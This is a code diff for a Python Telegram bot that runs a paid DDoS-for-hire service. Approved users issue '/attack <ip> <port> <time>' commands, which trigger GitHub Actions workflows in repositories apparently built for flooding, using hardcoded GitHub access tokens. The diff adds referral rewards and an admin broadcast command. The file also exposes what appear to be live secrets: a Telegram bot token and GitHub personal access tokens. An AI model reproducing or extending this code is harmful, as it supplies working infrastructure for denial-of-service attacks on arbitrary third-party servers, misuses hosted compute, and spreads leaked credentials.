@@ -10,13 +10,17 @@ from telegram import Update
 TELEGRAM_TOKEN = "7688656106:AAGemk2HxBFNPevOxulUH4Imc4e2F4o9Prs"
 ADMIN_ID = 6881937738
 
+# Referral Reward Settings
+NEW_USER_REWARD_DAYS = 1
+REFERRER_BONUS_DAYS = 2
+
 GITHUB_ACCOUNTS = [
     {'token': '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', 'repos': ['venomxpro1201-prog/DDOS1']},
     {'token': 'ghp_dehtsbfsl7iMTHQh4R1Y2rL92Zv18vfVK', 'repos': ['suraj5277275/turbo-cto-stem']}
 ]
 
 approved_users = {}
-used_referrals = set() # Tracks users who have already claimed a referral
+used_referrals = set()
 is_attack_running = False
 attack_end_time = 0 
 current_target = ""
@@ -32,24 +36,17 @@ def is_approved(user_id: int):
     return False
 
 def approve_user(user_id: int, days: int):
-    if days > 365: days = 365
+    if user_id != ADMIN_ID and days > 365:
+        days = 365
     current_expiry = approved_users.get(user_id, {}).get('expiry_time', time.time())
-    # If user is already approved, add time to current expiry; else start from now.
     start_time = max(current_expiry, time.time())
     expiry_time = start_time + (days * 86400)
-    
     if user_id not in approved_users:
         ref_code = generate_referral_code(user_id)
     else:
         ref_code = approved_users[user_id]['ref_code']
-        
-    approved_users[user_id] = {
-        'expiry_time': expiry_time, 
-        'approved_days': days,
-        'ref_code': ref_code
-    }
+    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days, 'ref_code': ref_code}
 
-# Auto-approve admin
 approve_user(ADMIN_ID, 36500)
 
 async def trigger_all_workflows_async(ip, port, duration):
@@ -63,83 +60,93 @@ async def trigger_all_workflows_async(ip, port, duration):
                 tasks.append(session.post(url, headers=headers, json=params, timeout=10))
         await asyncio.gather(*tasks, return_exceptions=True)
 
-# --- COMMANDS ---
+# --- COMMAND HANDLERS ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome = "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n/attack <ip> <port> <time>\n/Myid - Status & Referral Code\n/reffer <code> - Claim 1 Day\n/approve <id> <days>"
+    welcome = (
+        "⚡ 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️\n\n"
+        "🎯 /attack <ip> <port> <time>\n"
+        "👤 /Myid - Status & Referral Code\n"
+        "🎟️ /reffer <code> - Get Free Days\n"
+        "👑 /approve <id> <days>\n"
+        "🗑️ /remove <id>\n"
+        "📢 /broadcast <message> (Admin Only)"
+    )
     await update.message.reply_text(welcome)
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: /broadcast <message>")
+        return
+    
+    msg_text = " ".join(context.args)
+    broadcast_msg = f"📢 **ADMIN ANNOUNCEMENT** 📢\n\n{msg_text}"
+    
+    count = 0
+    # Send to all users currently in the approved list
+    for user_id in list(approved_users.keys()):
+        try:
+            await context.bot.send_message(chat_id=user_id, text=broadcast_msg, parse_mode="Markdown")
+            count += 1
+            await asyncio.sleep(0.05) # Avoid hitting Telegram's flood limits
+        except:
+            continue
+    
+    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")
 
 async def reffer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id in used_referrals:
-        await update.message.reply_text("❌ You have already used a referral code.")
+        await update.message.reply_text("❌ You already claimed a referral reward.")
         return
-
-    if len(context.args) != 1:
+    if not context.args:
         await update.message.reply_text("Usage: /reffer <referral_code>")
         return
-
     input_code = context.args[0]
-    referrer_id = None
-
-    # Find who the code belongs to
-    for uid, data in approved_users.items():
-        if data['ref_code'] == input_code:
-            referrer_id = uid
-            break
-
+    referrer_id = next((uid for uid, data in approved_users.items() if data['ref_code'] == input_code), None)
     if not referrer_id:
-        await update.message.reply_text("❌ Invalid Referral Code.")
+        await update.message.reply_text("❌ Invalid Code.")
         return
-
     if referrer_id == user_id:
-        await update.message.reply_text("❌ You cannot use your own code.")
+        await update.message.reply_text("❌ You can't refer yourself.")
         return
-
-    # Grant rewards
     used_referrals.add(user_id)
-    approve_user(user_id, 1) # New user gets 1 day
-    approve_user(referrer_id, 2) # Referrer gets 2 days bonus
-    
-    await update.message.reply_text(f"✅ SUCCESS!\n🎁 You received 1 day access.\n🙌 Referrer @{referrer_id} received 2 days bonus.")
+    approve_user(user_id, NEW_USER_REWARD_DAYS)
+    approve_user(referrer_id, REFERRER_BONUS_DAYS)
+    await update.message.reply_text(f"✅ Code Accepted!\n🎁 You got {NEW_USER_REWARD_DAYS} day.\n🎊 Referrer got {REFERRER_BONUS_DAYS} days bonus.")
 
 async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if is_approved(user_id):
         data = approved_users[user_id]
-        expiry = time.strftime("%Y-%m-%d", time.localtime(data['expiry_time']))
-        msg = f"✅ APPROVED\n🆔 {user_id}\n⏰ Expiry: {expiry}\n🎟️ Your Referral Code: `{data['ref_code']}`\n(Share code to get 2 days bonus!)"
+        expiry = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(data['expiry_time']))
+        msg = f"✅ APPROVED\n🆔 {user_id}\n⏰ Expiry: {expiry}\n🎟️ Ref Code: `{data['ref_code']}`"
     else:
-        msg = f"❌ NOT APPROVED\n🆔 {user_id}\n💡 Use `/reffer <code>` to get 1 day free!"
+        msg = f"❌ NOT APPROVED\n🆔 {user_id}\n💡 Use a referral code to get access!"
     await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global is_attack_running, attack_end_time, current_target
     if not is_approved(update.effective_user.id):
-        await update.message.reply_text("❌ Not approved.")
+        await update.message.reply_text("❌ No active subscription.")
         return
-    
     now = time.time()
     if is_attack_running and now < attack_end_time:
         rem = int(attack_end_time - now)
-        await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Wait: {rem}s\n🎯 Target: {current_target}")
+        await update.message.reply_text(f"⏳ Cooldown: {rem}s\n🎯 Target: {current_target}")
         return
-        
     try:
         ip, port, time_int = context.args[0], context.args[1], int(context.args[2])
         if not (1 <= time_int <= 300):
-            await update.message.reply_text("❌ Max 300 seconds.")
+            await update.message.reply_text("❌ Limit: 300s")
             return
     except:
         await update.message.reply_text("Usage: /attack <ip> <port> <time>")
         return
-
-    is_attack_running = True
-    attack_end_time = now + time_int
-    current_target = f"{ip}:{port}"
-    
-    await update.message.reply_text(f"🚀 ATTACK STARTED\n🎯 {ip}:{port}\n⏰ Time: {time_int}s")
+    is_attack_running, attack_end_time, current_target = True, now + time_int, f"{ip}:{port}"
+    await update.message.reply_text(f"🚀 ATTACK SENT\n🎯 {ip}:{port}\n⏰ {time_int}s")
     asyncio.create_task(execute_attack(update, ip, port, time_int))
 
 async def execute_attack(update, ip, port, duration):
@@ -147,26 +154,25 @@ async def execute_attack(update, ip, port, duration):
     try:
         await trigger_all_workflows_async(ip, port, duration)
         await asyncio.sleep(duration)
-        await update.message.reply_text(f"✅ ATTACK FINISHED\n🎯 {ip}:{port}")
+        await update.message.reply_text(f"✅ FINISHED: {ip}:{port}")
     finally:
-        is_attack_running = False
-        current_target = ""
+        is_attack_running, current_target = False, ""
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
-        user_id, days = int(context.args[0]), int(context.args[1])
-        approve_user(user_id, days)
-        await update.message.reply_text(f"✅ Approved {user_id} for {days} days.")
+        uid, days = int(context.args[0]), int(context.args[1])
+        approve_user(uid, days)
+        await update.message.reply_text(f"✅ Approved {uid} for {days} days.")
     except: pass
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
-        user_id = int(context.args[0])
-        if user_id in approved_users:
-            del approved_users[user_id]
-            await update.message.reply_text(f"🗑️ User {user_id} removed.")
+        uid = int(context.args[0])
+        if uid in approved_users:
+            del approved_users[uid]
+            await update.message.reply_text(f"🗑️ User {uid} removed.")
     except: pass
 
 def main():
@@ -177,7 +183,8 @@ def main():
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CommandHandler("remove", remove))
     app.add_handler(CommandHandler("reffer", reffer))
-    print("✅ Bot is online with Referral System.")
+    app.add_handler(CommandHandler("broadcast", broadcast))
+    print("🚀 Bot Started Successfully!")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
